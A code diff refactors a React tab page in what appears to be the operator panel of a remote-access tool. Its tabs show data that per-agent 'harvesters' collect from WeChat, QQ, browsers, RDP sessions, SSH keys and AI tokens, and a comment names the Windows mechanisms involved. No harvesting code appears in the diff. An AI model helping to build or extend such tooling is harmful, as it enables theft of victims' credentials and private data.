@@ -2,6 +2,7 @@ import { useState } from 'react';
 import { useTranslation } from 'react-i18next';
 import { Tabs } from '@heroui/react';
 import { useAgent } from '../../contexts/AgentContext';
+import { useAgentPlatform } from '../../hooks/useAgentPlatform';
 import { WeChatTab } from './WeChatTab';
 import { QQTab } from './QQTab';
 import { BrowserTab } from './BrowserTab';
@@ -12,7 +13,20 @@ import { RDPTab } from './RDPTab';
 export default function SoftwareDataPage() {
   const { t } = useTranslation();
   const { agentId } = useAgent();
+  const platform = useAgentPlatform();
   const [tab, setTab] = useState<string>('wechat');
+
+  // WeChat/QQ/browser/RDP harvesters are Windows-only (DPAPI, NTQQ, TERMSRV);
+  // SSH keys and AI tokens are cross-platform.
+  const isWindows = platform === 'windows';
+  const tabs = [
+    { id: 'wechat', label: t('othersoft.wechat'), render: <WeChatTab agentId={agentId} />, windowsOnly: true },
+    { id: 'qq', label: t('othersoft.qq'), render: <QQTab agentId={agentId} />, windowsOnly: true },
+    { id: 'browser', label: t('othersoft.browser.title'), render: <BrowserTab agentId={agentId} />, windowsOnly: true },
+    { id: 'ai', label: t('othersoft.ai.title'), render: <AITab agentId={agentId} /> },
+    { id: 'ssh', label: t('othersoft.ssh.title'), render: <SSHTab agentId={agentId} /> },
+    { id: 'rdp', label: t('othersoft.rdp.title'), render: <RDPTab agentId={agentId} />, windowsOnly: true },
+  ].filter((tb) => !tb.windowsOnly || isWindows);
 
   if (!agentId) {
     return (
@@ -22,26 +36,21 @@ export default function SoftwareDataPage() {
     );
   }
 
+  const activeTab = tabs.some((tb) => tb.id === tab) ? tab : tabs[0]!.id;
+
   return (
     <div className="space-y-3">
-      <Tabs selectedKey={tab} onSelectionChange={(key) => setTab(String(key))}>
+      <Tabs selectedKey={activeTab} onSelectionChange={(key) => setTab(String(key))}>
         <Tabs.ListContainer className="flex justify-center">
           <Tabs.List aria-label={t('othersoft.tabsLabel')} className="mx-auto w-lg">
-            <Tabs.Tab id="wechat">{t('othersoft.wechat')}<Tabs.Indicator /></Tabs.Tab>
-            <Tabs.Tab id="qq">{t('othersoft.qq')}<Tabs.Indicator /></Tabs.Tab>
-            <Tabs.Tab id="browser">{t('othersoft.browser.title')}<Tabs.Indicator /></Tabs.Tab>
-            <Tabs.Tab id="ai">{t('othersoft.ai.title')}<Tabs.Indicator /></Tabs.Tab>
-            <Tabs.Tab id="ssh">{t('othersoft.ssh.title')}<Tabs.Indicator /></Tabs.Tab>
-            <Tabs.Tab id="rdp">{t('othersoft.rdp.title')}<Tabs.Indicator /></Tabs.Tab>
+            {tabs.map((tb) => (
+              <Tabs.Tab key={tb.id} id={tb.id}>{tb.label}<Tabs.Indicator /></Tabs.Tab>
+            ))}
           </Tabs.List>
         </Tabs.ListContainer>
-
-        <Tabs.Panel id="wechat"><WeChatTab agentId={agentId} /></Tabs.Panel>
-        <Tabs.Panel id="qq"><QQTab agentId={agentId} /></Tabs.Panel>
-        <Tabs.Panel id="browser"><BrowserTab agentId={agentId} /></Tabs.Panel>
-        <Tabs.Panel id="ai"><AITab agentId={agentId} /></Tabs.Panel>
-        <Tabs.Panel id="ssh"><SSHTab agentId={agentId} /></Tabs.Panel>
-        <Tabs.Panel id="rdp"><RDPTab agentId={agentId} /></Tabs.Panel>
+        {tabs.map((tb) => (
+          <Tabs.Panel key={tb.id} id={tb.id}>{tb.render}</Tabs.Panel>
+        ))}
       </Tabs>
     </div>
   );
